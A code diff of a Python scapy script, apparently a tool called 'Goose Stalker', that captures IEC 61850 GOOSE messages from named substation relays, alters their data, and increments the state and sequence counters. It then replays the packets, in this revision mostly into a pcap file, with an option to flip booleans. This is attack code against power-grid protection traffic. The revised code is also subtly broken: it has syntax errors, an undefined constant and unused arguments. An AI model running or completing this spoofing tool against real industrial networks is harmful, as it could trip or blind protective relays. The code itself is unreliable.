@@ -2,15 +2,34 @@ from scapy.all import *
 import goose
 import sys, signal
 import time, datetime
+import argparse
 
-DEBUG = False
-filetime = datetime.datetime.fromtimestamp(int(time.time())).strftime('%Y%m%d%H%M%S')
-#ONF_ORIG = 'goose_orig_' + filetime + '.pcap'
-ONF_MOD  = 'goose_mod_' + filetime + '.pcap'
+
+
+DEBUG = 2
 GOOSE_TYPE = 0x88b8
+filetime = datetime.datetime.fromtimestamp(int(time.time())).strftime('%Y%m%d%H%M%S')
+#ONF_MOD  = '/tmp/goose_mod_' + filetime + '.pcap'
 # Device names to concentrate interactions
-deviceName = ['C60_Device1','C60-Device2','D60-Device3','SEL-Device4']
-RAPID_SEND = 3
+#deviceNames = ['C60_Device1','C60-Device2','D60-Device3','SEL-Device4']
+#RAPID_SEND = 3
+IGNORE_T = []
+
+#########################
+# Parse Arguments
+#########################
+p_args = argparse.ArgumentParser(description='CutSec: Goose Stalker')
+p_args.add_argument('-D','--debug',default=0,dest='DEBUG',help='Turn on debugging level: 0 off, 1 normal, 2 verbose')
+p_args.add_argument('-o','--outfile',default='/tmp/goose_mod_' + filetime '.pcap',dest='onfPcap') 
+p_args.add_argument('-L','--device_list',nargs='*',default=[],dest='deviceNames',help='List of device names to limit interactions: C60_Device1 C60-Device2 D60-Device3 SEL-Device4)
+p_args.add_argument('-c','--send-cnt',default=3,dest='sendCnt')
+p_args.add_argument('-i','--interface',default='eth0',dest='capInterface')
+p_args.add_argument('-d','--delay',default=60,dest='resendTimeDelay')
+p_args.add_argument('-F','--flip-booleans',action='store_true',dest='flipBooleans')
+p_args.add_argument('-f','--infile',dest='infPcap')
+
+args = p_args.parse_args()
+
 
 def signal_handler(sig,frame):
     print('Manual interrupt captured: cntl-c')
@@ -22,7 +41,7 @@ def scapyWrite(pkt):
 
 def timeToString(t):
     if DEBUG: print('In timeToString')
-    t4r = struct.unpack('>i',p[:4])[0]
+    t4r = struct.unpack('>i',t[:4])[0]
     ptime = datetime.datetime.fromtimestamp(t4r).strftime('%Y-%m-%d- %H:%M:%S')
     return ptime
 
@@ -52,7 +71,6 @@ def modPacket(pkt):
         i = i + pktData[i+1] + 2
     return newData
 
-IGNORE_T = []
 
 def gooseCheck(p):
     isGoose = False
@@ -62,8 +80,12 @@ def gooseCheck(p):
         if p[Ether].type == GOOSE_TYPE: isGoose = True
     if isGoose:
         try:
+            #if DEBUG: print('isGoose')
+            #if DEBUG > 1: print('goID: %r'%p.getfieldval('goID').load)
+            #goID = p.getfieldval('goID').load.decode()
             goID = p.getfieldval('goID').load.decode()
-            t = p.getfieldval('t').load.decode()
+            #if DEBUG > 1: print('t: %r'%p.getfieldval('t').load)
+            t = p.getfieldval('t').load
             if t in IGNORE_T: return
             if DEBUG: print('goID: %r'%(goID))
             #if goID in deviceName:
@@ -74,24 +96,36 @@ def gooseCheck(p):
                 if DEBUG: print('modData modded p: %r\n\n'%(p))
                 #scapyWrite(newPkt)
                 try:
-                    #print('Sending: %r\n\n'%(p))
+                    print('Sending: %r\n\n'%(p))
                     if DEBUG: print('Sending packets')
                     IGNORE_T.append(t)
-                    if DEBUG: print('stNum get')
+                    #if DEBUG: print('stNum get: %r'%(stNum))
                     stNum = p.getfieldval('stNum').load.decode()
+                    if DEBUG: print('stNum get: %r'%(stNum))
                     stNum = chr(ord(stNum) + 1)
                     if DEBUG: print('stNum set: %r'%(stNum))
-                    p.setfieldval('stNum'.load,stNum + 1)
+                    p.setfieldval('stNum',stNum)
                     if DEBUG: print('stNum go')
-                    sqNum = 0
+                    if DEBUG: print('sqNum get: %r'%(p.getfieldval('sqNum').load))
+                    sqNum = p.getfieldval('sqNum').load
+                    if DEBUG > 1: print('sqNumLen: %r'%(p.getfieldval('sqNumLen')))
                     for e in range(RAPID_SEND):
-                        sqNum += 1
+                        sqNumLen = p.getfieldval('sqNumLen')
+                        sqNum = (int.from_bytes(sqNum,'big') + 1).to_bytes(sqNumLen,'big')
+                        #p.setfieldval('sqNum', chr(0) + chr(0) + chr(sqNum))
                         p.setfieldval('sqNum', sqNum)
-                        sendp(p,iface="eth0")
-                except:
-                    print('Failed to send: %r'%p)
-        except:
-            pass
+                        if DEBUG: print('sqNum set: %r'%(sqNum))
+                        scapyWrite(p)
+                        #sendp(p,iface="eth0")
+                except Exception as e:
+                    print('Failed to send: %s: %r'%(e,p))
+                    return 1
+                    #pass
+        except Exception as e:
+            print('Failed to send: %s: %r'%(e,p))
+            return 1
+            #pass
+        return 0
 
 if __name__ == "__main__":
     # Allow user to exit program
@@ -101,6 +135,8 @@ if __name__ == "__main__":
     if len(sys.argv) > 1:
         INF = sys.argv[1]
         packets = rdpcap(INF)
+        for p in packets:
+            if gooseCheck(p): break
     # Else, sniff packets
     else:
         # Only capture Goose messages
